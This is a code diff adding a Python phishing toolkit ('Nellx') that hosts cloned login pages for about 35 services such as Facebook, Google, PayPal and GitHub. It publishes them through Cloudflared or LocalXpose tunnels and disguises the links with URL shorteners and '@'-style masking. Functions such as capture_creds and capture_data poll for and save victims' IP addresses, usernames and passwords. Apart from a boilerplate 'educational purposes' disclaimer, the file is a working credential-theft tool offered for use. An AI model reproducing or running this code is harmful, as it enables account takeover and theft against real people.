+                    if f == output or f.endswith("/" + output):
+                        extracted = BASE_DIR / ".server" / f
+                        break
+            if extracted != dest_output:
+                shutil.move(str(extracted), str(dest_output))
+        elif dest_file.suffix == ".tgz":
+            with tarfile.open(dest_file) as tar:
+                tar.extractall(BASE_DIR / ".server")
+            extracted = BASE_DIR / ".server" / output
+            if not extracted.exists():
+                for member in tar.getmembers():
+                    if member.name.endswith(output):
+                        extracted = BASE_DIR / ".server" / member.name
+                        break
+            if extracted != dest_output:
+                shutil.move(str(extracted), str(dest_output))
+        else:
+            shutil.move(str(dest_file), str(dest_output))
+        dest_output.chmod(0o755)
+    except Exception:
+        return False
+    finally:
+        if dest_file.exists():
+            dest_file.unlink()
+    return True
+
+def install_cloudflared() -> None:
+    target = BASE_DIR / ".server" / "cloudflared"
+    if target.exists():
+        print(f"\n{GREEN}[{WHITE}+{GREEN}]{GREEN} Cloudflared already installed.")
+        return
+    system_cf = shutil.which("cloudflared")
+    if system_cf:
+        shutil.copy2(system_cf, target)
+        print(f"\n{GREEN}[{WHITE}+{GREEN}]{GREEN} Cloudflared found on system, copied.")
+        return
+    print(f"\n{GREEN}[{WHITE}+{GREEN}]{CYAN} Installing Cloudflared...{WHITE}")
+    arch = platform.machine()
+    url_map = {
+        'arm': 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm',
+        'aarch64': 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64',
+        'x86_64': 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64',
+    }
+    url = url_map.get(arch, 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386')
+    if not download(url, 'cloudflared'):
+        print(f"\n{RED}[{WHITE}!{RED}]{RED} Failed to download cloudflared. Install it manually.")
+        sys.exit(1)
+
+def install_localxpose() -> None:
+    target = BASE_DIR / ".server" / "loclx"
+    if target.exists():
+        print(f"\n{GREEN}[{WHITE}+{GREEN}]{GREEN} LocalXpose already installed.")
+        return
+    system_loclx = shutil.which("loclx")
+    if system_loclx:
+        shutil.copy2(system_loclx, target)
+        print(f"\n{GREEN}[{WHITE}+{GREEN}]{GREEN} LocalXpose found on system, copied.")
+        return
+    print(f"\n{GREEN}[{WHITE}+{GREEN}]{CYAN} Installing LocalXpose...{WHITE}")
+    arch = platform.machine()
+    url_map = {
+        'arm': 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip',
+        'aarch64': 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm64.zip',
+        'x86_64': 'https://api.localxpose.io/api/v2/downloads/loclx-linux-amd64.zip',
+    }
+    url = url_map.get(arch, 'https://api.localxpose.io/api/v2/downloads/loclx-linux-386.zip')
+    if not download(url, 'loclx'):
+        print(f"\n{RED}[{WHITE}!{RED}]{RED} Failed to download LocalXpose.")
+        print(f"{ORANGE}Please install it manually and place it in {target} or in your PATH.{WHITE}")
+        sys.exit(1)
+
+# ────────────────── Exit / About / ... ──────────────────────
+def msg_exit() -> None:
+    print("\033c", end="")
+    show()
+    print(f"{GREENBG}{BLACK} Thank you for using Nellx. Have a good day.{RESETBG}")
+    reset_color()
+    sys.exit(0)
+
+def about() -> None:
+    print("\033c", end="")
+    show()
+    print(f"""
+{GREEN} Author   {RED}:  {ORANGE}zaazouamouad
+{GREEN} Github   {RED}:  {CYAN}https://github.com/zaazouamouad/nellx
+
+{WHITE} {REDBG}Warning:{RESETBG}
+{CYAN}  This Tool is made for educational purposes 
+  only {RED}!{WHITE}{CYAN} Author will not be responsible for 
+  any misuse of this toolkit {RED}!{WHITE}
+
+{RED}[{WHITE}00{RED}]{ORANGE} Main Menu     {RED}[{WHITE}99{RED}]{ORANGE} Exit
+""")
+    choice = input(f"{RED}[{WHITE}-{RED}]{GREEN} Select an option : {BLUE}")
+    if choice in ["99"]:
+        msg_exit()
+    elif choice in ["0", "00"]:
+        print(f"\n{GREEN}[{WHITE}+{GREEN}]{CYAN} Returning to main menu...")
+        time.sleep(1)
         main_menu()
-    except KeyboardInterrupt:
-        print("\nGoodbye!")
-        sys.exit(0)
+    else:
+        print(f"\n{RED}[{WHITE}!{RED}]{RED} Invalid Option, Try Again...")
+        time.sleep(1)
+        about()
+
+def cusport() -> None:
+    global PORT
+    print()
+    ans = input(f"{RED}[{WHITE}?{RED}]{ORANGE} Do You Want A Custom Port {GREEN}[{CYAN}y{GREEN}/{CYAN}N{GREEN}]: {ORANGE}").strip().lower()
+    if ans == 'y':
+        print()
+        cu_p = input(f"{RED}[{WHITE}-{RED}]{ORANGE} Enter Your Custom 4-digit Port [1024-9999] : {WHITE}").strip()
+        if cu_p and re.match(r'^[1-9]\d{3}$', cu_p) and 1024 <= int(cu_p) <= 9999:
+            PORT = cu_p
+            print()
+        else:
+            print(f"\n{RED}[{WHITE}!{RED}]{RED} Invalid 4-digit Port : {cu_p}, Try Again...{WHITE}")
+            time.sleep(2)
+            print("\033c", end="")
+            banner_small()
+            cusport()
+    else:
+        print(f"\n{RED}[{WHITE}-{RED}]{BLUE} Using Default Port {PORT}...{WHITE}\n")
+
+php_process = None
+
+def setup_site(website: str) -> None:
+    print(f"\n{RED}[{WHITE}-{RED}]{BLUE} Setting up server...{WHITE}")
+    src = BASE_DIR / ".sites" / website
+    dst = BASE_DIR / ".server" / "www"
+    if src.exists():
+        for item in src.iterdir():
+            if item.is_dir():
+                shutil.copytree(item, dst / item.name, dirs_exist_ok=True)
+            else:
+                shutil.copy2(item, dst / item.name)
+    ip_php = BASE_DIR / ".sites" / "ip.php"
+    if ip_php.exists():
+        shutil.copy2(ip_php, dst / "ip.php")
+    print(f"\n{RED}[{WHITE}-{RED}]{BLUE} Starting PHP server...{WHITE}")
+    global php_process
+    php_process = subprocess.Popen(
+        ["php", "-S", f"{HOST}:{PORT}"],
+        cwd=dst,
+        stdout=subprocess.DEVNULL,
+        stderr=subprocess.DEVNULL
+    )
+
+# ────────────────── Data Capture ────────────────────────────
+def capture_ip() -> None:
+    ip_file = BASE_DIR / ".server" / "www" / "ip.txt"
+    if ip_file.exists():
+        content = ip_file.read_text()
+        ip_match = re.search(r'IP: (.*)', content)
+        if ip_match:
+            ip = ip_match.group(1).strip()
+            print(f"\n{RED}[{WHITE}-{RED}]{GREEN} Victim's IP : {BLUE}{ip}")
+            auth_ip = BASE_DIR / "auth" / "ip.txt"
+            with open(auth_ip, 'a') as authf:
+                authf.write(content)
+            print(f"\n{RED}[{WHITE}-{RED}]{BLUE} Saved in : {ORANGE}auth/ip.txt")
+        ip_file.unlink()
+
+def capture_creds() -> None:
+    user_file = BASE_DIR / ".server" / "www" / "usernames.txt"
+    if user_file.exists():
+        content = user_file.read_text()
+        account_match = re.search(r'Username: (.*)', content)
+        pass_match = re.search(r'Pass: (.*)', content)
+        if account_match:
+            account = account_match.group(1).strip()
+            print(f"\n{RED}[{WHITE}-{RED}]{GREEN} Account : {BLUE}{account}")
+        if pass_match:
+            password = pass_match.group(1).strip()
+            print(f"\n{RED}[{WHITE}-{RED}]{GREEN} Password : {BLUE}{password}")
+        (BASE_DIR / "auth" / "usernames.dat").open('a').write(content)
+        print(f"\n{RED}[{WHITE}-{RED}]{BLUE} Saved in : {ORANGE}auth/usernames.dat")
+        user_file.unlink()
+        print(f"\n{RED}[{WHITE}-{RED}]{ORANGE} Waiting for Next Login Info, {BLUE}Ctrl + C {ORANGE}to exit. ")
+
+def capture_data() -> None:
+    print(f"\n{RED}[{WHITE}-{RED}]{ORANGE} Waiting for Login Info, {BLUE}Ctrl + C {ORANGE}to exit...")
+    while True:
+        if (BASE_DIR / ".server" / "www" / "ip.txt").exists():
+            print(f"\n\n{RED}[{WHITE}-{RED}]{GREEN} Victim IP Found !")
+            capture_ip()
+        time.sleep(0.75)
+        if (BASE_DIR / ".server" / "www" / "usernames.txt").exists():
+            print(f"\n\n{RED}[{WHITE}-{RED}]{GREEN} Login info Found !!")
+            capture_creds()
+        time.sleep(0.75)
+
+# ────────────────── Tunnelling ──────────────────────────────
+def start_cloudflared() -> None:
+    cld_log = BASE_DIR / ".server" / ".cld.log"
+    if cld_log.exists():
+        cld_log.unlink()
+    cusport()
+    print(f"\n{RED}[{WHITE}-{RED}]{GREEN} Initializing... {GREEN}( {CYAN}http://{HOST}:{PORT} {GREEN})")
+    time.sleep(1)
+    setup_site(current_website)
+    print(f"\n\n{RED}[{WHITE}-{RED}]{GREEN} Launching Cloudflared...")
+    if shutil.which("termux-chroot"):
+        cmd = ["termux-chroot", str(BASE_DIR / ".server" / "cloudflared"), "tunnel", "-url", f"{HOST}:{PORT}", "--logfile", str(cld_log)]
+    else:
+        cmd = [str(BASE_DIR / ".server" / "cloudflared"), "tunnel", "-url", f"{HOST}:{PORT}", "--logfile", str(cld_log)]
+    subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    time.sleep(8)
+    try:
+        log = cld_log.read_text()
+        url_match = re.search(r'https://[-0-9a-z]*\.trycloudflare\.com', log)
+        if url_match:
+            cldflr_url = url_match.group(0)
+            custom_url(cldflr_url)
+            capture_data()
+        else:
+            print("Error: Cloudflared URL not found.")
+    except Exception as e:
+        print(f"Error reading cloudflared log: {e}")
+
+def localxpose_auth() -> None:
+    subprocess.Popen([str(BASE_DIR / ".server" / "loclx"), "-help"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    time.sleep(1)
+    auth_f = Path.home() / ".localxpose" / ".access"
+    auth_f.parent.mkdir(parents=True, exist_ok=True)
+    result = subprocess.run([str(BASE_DIR / ".server" / "loclx"), "account", "status"], capture_output=True, text=True)
+    if "Error" in result.stdout or "Error" in result.stderr or not auth_f.exists():
+        print(f"\n{RED}[{WHITE}!{RED}]{GREEN} Create an account on {ORANGE}localxpose.io{GREEN} & copy the token\n")
+        time.sleep(3)
+        token = input(f"{RED}[{WHITE}-{RED}]{ORANGE} Input Loclx Token :{ORANGE} ")
+        if not token.strip():
+            print(f"\n{RED}[{WHITE}!{RED}]{RED} You have to input Localxpose Token.")
+            time.sleep(2)
+            tunnel_menu()
+            return
+        auth_f.write_text(token.strip())
+
+def start_loclx() -> None:
+    cusport()
+    print(f"\n{RED}[{WHITE}-{RED}]{GREEN} Initializing... {GREEN}( {CYAN}http://{HOST}:{PORT} {GREEN})")
+    time.sleep(1)
+    setup_site(current_website)
+    localxpose_auth()
+    print()
+    opinion = input(f"{RED}[{WHITE}?{RED}]{ORANGE} Change Loclx Server Region? {GREEN}[{CYAN}y{GREEN}/{CYAN}N{GREEN}]:{ORANGE} ").strip().lower()
+    loclx_region = "eu" if opinion == 'y' else "us"
+    print(f"\n\n{RED}[{WHITE}-{RED}]{GREEN} Launching LocalXpose...")
+    if shutil.which("termux-chroot"):
+        cmd = ["termux-chroot", str(BASE_DIR / ".server" / "loclx"), "tunnel", "--raw-mode", "http", "--region", loclx_region, "--https-redirect", "-t", f"{HOST}:{PORT}"]
+    else:
+        cmd = [str(BASE_DIR / ".server" / "loclx"), "tunnel", "--raw-mode", "http", "--region", loclx_region, "--https-redirect", "-t", f"{HOST}:{PORT}"]
+    loclx_log = BASE_DIR / ".server" / ".loclx"
+    if loclx_log.exists():
+        loclx_log.unlink()
+    with open(loclx_log, 'w') as logf:
+        subprocess.Popen(cmd, stdout=logf, stderr=subprocess.STDOUT)
+    time.sleep(12)
+    try:
+        log = loclx_log.read_text()
+        url_match = re.search(r'[0-9a-zA-Z.]*\.loclx\.io', log)
+        if url_match:
+            loclx_url = url_match.group(0)
+            custom_url(loclx_url)
+            capture_data()
+        else:
+            print("Error: LocalXpose URL not found.")
+    except Exception as e:
+        print(f"Error reading localxpose log: {e}")
+
+def start_localhost() -> None:
+    cusport()
+    print(f"\n{RED}[{WHITE}-{RED}]{GREEN} Initializing... {GREEN}( {CYAN}http://{HOST}:{PORT} {GREEN})")
+    setup_site(current_website)
+    time.sleep(1)
+    print("\033c", end="")
+    banner_small()
+    print(f"\n{RED}[{WHITE}-{RED}]{GREEN} Successfully Hosted at : {GREEN}{CYAN}http://{HOST}:{PORT} {GREEN}")
+    capture_data()
+
+# ────────────────── URL shorten & mask ─────────────────────
+def custom_mask() -> Optional[str]:
+    print("\033c", end="")
+    banner_small()
+    print()
+    ans = input(f"{RED}[{WHITE}?{RED}]{ORANGE} Do you want to change Mask URL? {GREEN}[{CYAN}y{GREEN}/{CYAN}N{GREEN}] :{ORANGE} ").strip().lower()
+    if ans == 'y':
+        print(f"\n{RED}[{WHITE}-{RED}]{GREEN} Enter your custom URL below {CYAN}({ORANGE}Example: https://get-free-followers.com{CYAN})\n")
+        mask_url = input(f"{WHITE} ==> {ORANGE}").strip()
+        if mask_url.startswith("http://") or mask_url.startswith("https://") or mask_url.startswith("www."):
+            print(f"\n{RED}[{WHITE}-{RED}]{CYAN} Using custom Masked Url :{GREEN} {mask_url}")
+            return mask_url
+        else:
+            print(f"\n{RED}[{WHITE}!{RED}]{ORANGE} Invalid url type..Using the Default one..")
+    return None
+
+def site_stat(url: str) -> bool:
+    try:
+        req = urllib.request.Request(url + "https://github.com", method='HEAD')
+        resp = urllib.request.urlopen(req, timeout=5)
+        return str(resp.status)[0] == '2'
+    except Exception:
+        return False
+
+def shorten(shortener: str, long_url: str) -> Optional[str]:
+    try:
+        with urllib.request.urlopen(shortener + long_url) as resp:
+            data = resp.read().decode()
+        if "shrtco.de" in shortener:
+            return json.loads(data)["result"]["short_link2"]
+        else:
+            return data.strip()
+    except Exception:
+        return None
+
+def custom_url(phish_url: str) -> None:
+    url = phish_url.replace("http://", "").replace("https://", "")
+    isgd = "https://is.gd/create.php?format=simple&url="
+    shortcode = "https://api.shrtco.de/v2/shorten?url="
+    tinyurl = "https://tinyurl.com/api-create.php?url="
+
+    mask = custom_mask()
+    time.sleep(1)
+    print("\033c", end="")
+    banner_small()
+
+    full_url = "https://" + url
+    processed_url = None
+    masked_url = None
+
+    if re.search(r'[-a-zA-Z0-9.]*\.(trycloudflare\.com|loclx\.io)', url):
+        for service in [isgd, shortcode, tinyurl]:
+            if site_stat(service):
+                processed = shorten(service, full_url)
+                if processed:
+                    processed_url = "https://" + processed
+                    if mask:
+                        masked_url = f"{mask}@{processed}"
+                    break
+        if processed_url:
+            print(f"\n{RED}[{WHITE}-{RED}]{BLUE} URL 1 : {GREEN}{full_url}")
+            print(f"\n{RED}[{WHITE}-{RED}]{BLUE} URL 2 : {ORANGE}{processed_url}")
+            if masked_url:
+                print(f"\n{RED}[{WHITE}-{RED}]{BLUE} URL 3 : {ORANGE}{masked_url}")
+        else:
+            print(f"\n{RED}[{WHITE}-{RED}]{BLUE} Unable to Short URL")
+    else:
+        print(f"\n{RED}[{WHITE}-{RED}]{BLUE} URL : {GREEN}{full_url}")
+
+# ────────────────── Site menus (original colours) ───────────
+def tunnel_menu() -> None:
+    print("\033c", end="")
+    banner_small()
+    print(f"""
+{RED}[{WHITE}01{RED}]{ORANGE} Localhost
+{RED}[{WHITE}02{RED}]{ORANGE} Cloudflared  {RED}[{CYAN}Auto Detects{RED}]
+{RED}[{WHITE}03{RED}]{ORANGE} LocalXpose   {RED}[{CYAN}NEW! Max 15Min{RED}]
+""")
+    choice = input(f"{RED}[{WHITE}-{RED}]{GREEN} Select a port forwarding service : {BLUE}")
+    if choice in ["1", "01"]:
+        start_localhost()
+    elif choice in ["2", "02"]:
+        start_cloudflared()
+    elif choice in ["3", "03"]:
+        start_loclx()
+    else:
+        print(f"\n{RED}[{WHITE}!{RED}]{RED} Invalid Option, Try Again...")
+        time.sleep(1)
+        tunnel_menu()
+
+def site_facebook() -> None:
+    global current_website
+    print("\033c", end="")
+    banner_small()
+    print(f"""
+{RED}[{WHITE}01{RED}]{ORANGE} Traditional Login Page
+{RED}[{WHITE}02{RED}]{ORANGE} Advanced Voting Poll Login Page
+{RED}[{WHITE}03{RED}]{ORANGE} Fake Security Login Page
+{RED}[{WHITE}04{RED}]{ORANGE} Facebook Messenger Login Page
+""")
+    choice = input(f"{RED}[{WHITE}-{RED}]{GREEN} Select an option : {BLUE}")
+    options = {
+        "1": "facebook", "01": "facebook",
+        "2": "fb_advanced", "02": "fb_advanced",
+        "3": "fb_security", "03": "fb_security",
+        "4": "fb_messenger", "04": "fb_messenger",
+    }
+    if choice in options:
+        current_website = options[choice]
+        tunnel_menu()
+    else:
+        print(f"\n{RED}[{WHITE}!{RED}]{RED} Invalid Option, Try Again...")
+        time.sleep(1)
+        site_facebook()
+
+def site_instagram() -> None:
+    global current_website
+    print("\033c", end="")
+    banner_small()
+    print(f"""
+{RED}[{WHITE}01{RED}]{ORANGE} Traditional Login Page
+{RED}[{WHITE}02{RED}]{ORANGE} Auto Followers Login Page
+{RED}[{WHITE}03{RED}]{ORANGE} 1000 Followers Login Page
+{RED}[{WHITE}04{RED}]{ORANGE} Blue Badge Verify Login Page
+""")
+    choice = input(f"{RED}[{WHITE}-{RED}]{GREEN} Select an option : {BLUE}")
+    options = {
+        "1": "instagram", "01": "instagram",
+        "2": "ig_followers", "02": "ig_followers",
+        "3": "insta_followers", "03": "insta_followers",
+        "4": "ig_verify", "04": "ig_verify",
+    }
+    if choice in options:
+        current_website = options[choice]
+        tunnel_menu()
+    else:
+        print(f"\n{RED}[{WHITE}!{RED}]{RED} Invalid Option, Try Again...")
+        time.sleep(1)
+        site_instagram()
+
+def site_gmail() -> None:
+    global current_website
+    print("\033c", end="")
+    banner_small()
+    print(f"""
+{RED}[{WHITE}01{RED}]{ORANGE} Gmail Old Login Page
+{RED}[{WHITE}02{RED}]{ORANGE} Gmail New Login Page
+{RED}[{WHITE}03{RED}]{ORANGE} Advanced Voting Poll
+""")
+    choice = input(f"{RED}[{WHITE}-{RED}]{GREEN} Select an option : {BLUE}")
+    options = {
+        "1": "google", "01": "google",
+        "2": "google_new", "02": "google_new",
+        "3": "google_poll", "03": "google_poll",
+    }
+    if choice in options:
+        current_website = options[choice]
+        tunnel_menu()
+    else:
+        print(f"\n{RED}[{WHITE}!{RED}]{RED} Invalid Option, Try Again...")
+        time.sleep(1)
+        site_gmail()
+
+def site_vk() -> None:
+    global current_website
+    print("\033c", end="")
+    banner_small()
+    print(f"""
+{RED}[{WHITE}01{RED}]{ORANGE} Traditional Login Page
+{RED}[{WHITE}02{RED}]{ORANGE} Advanced Voting Poll Login Page
+""")
+    choice = input(f"{RED}[{WHITE}-{RED}]{GREEN} Select an option : {BLUE}")
+    options = {"1": "vk", "01": "vk", "2": "vk_poll", "02": "vk_poll"}
+    if choice in options:
+        current_website = options[choice]
+        tunnel_menu()
+    else:
+        print(f"\n{RED}[{WHITE}!{RED}]{RED} Invalid Option, Try Again...")
+        time.sleep(1)
+        site_vk()
+
+# ────────────────── MAIN MENU (only the attack list in purple) ───
+current_website: Optional[str] = None
+
+def main_menu() -> None:
+    global current_website
+    print("\033c", end="")
+    show()
+    print()
+    # Use a purple color only for the attack list
+    PURPLE = "\033[35m"
+
+    print(f"""{PURPLE}{BOLD}
+[01] Facebook      [11] Twitch       [21] DeviantArt
+[02] Instagram     [12] Pinterest    [22] Badoo
+[03] Google        [13] Snapchat     [23] Origin
+[04] Microsoft     [14] Linkedin     [24] DropBox
+[05] Netflix       [15] Ebay         [25] Yahoo
+[06] Paypal        [16] Quora        [26] Wordpress
+[07] Steam         [17] Protonmail   [27] Yandex
+[08] Twitter       [18] Spotify      [28] StackoverFlow
+[09] Playstation   [19] Reddit       [29] Vk
+[10] Tiktok        [20] Adobe        [30] XBOX
+[31] Mediafire     [32] Gitlab       [33] Github
+[34] Discord       [35] Roblox
+{RESET}
+""")
+    print(f"{RED}[{WHITE}99{RED}]{ORANGE} About         {RED}[{WHITE}00{RED}]{ORANGE} Exit")
+    choice = input(f"{RED}[{WHITE}-{RED}]{GREEN} Select an option : {BLUE}")
+
+    single_sites = {
+        "4": "microsoft", "04": "microsoft",
+        "5": "netflix", "05": "netflix",
+        "6": "paypal", "06": "paypal",
+        "7": "steam", "07": "steam",
+        "8": "twitter", "08": "twitter",
+        "9": "playstation", "09": "playstation",
+        "10": "tiktok",
+        "11": "twitch", "12": "pinterest", "13": "snapchat",
+        "14": "linkedin", "15": "ebay", "16": "quora",
+        "17": "protonmail", "18": "spotify", "19": "reddit",
+        "20": "adobe", "21": "deviantart", "22": "badoo",
+        "23": "origin", "24": "dropbox", "25": "yahoo",
+        "26": "wordpress", "27": "yandex", "28": "stackoverflow",
+        "30": "xbox", "31": "mediafire", "32": "gitlab",
+        "33": "github", "34": "discord", "35": "roblox",
+    }
+
+    submenus = {
+        "1": site_facebook, "01": site_facebook,
+        "2": site_instagram, "02": site_instagram,
+        "3": site_gmail, "03": site_gmail,
+        "29": site_vk,
+    }
+
+    if choice in submenus:
+        submenus[choice]()
+    elif choice in single_sites:
+        current_website = single_sites[choice]
+        tunnel_menu()
+    elif choice == "99":
+        about()
+    elif choice in ["0", "00"]:
+        msg_exit()
+    else:
+        print(f"\n{RED}[{WHITE}!{RED}]{RED} Invalid Option, Try Again...")
+        time.sleep(1)
+        main_menu()
+
+if __name__ == "__main__":
+    kill_pid()
+    dependencies()
+    check_status()
+    install_cloudflared()
+    install_localxpose()
+    main_menu()
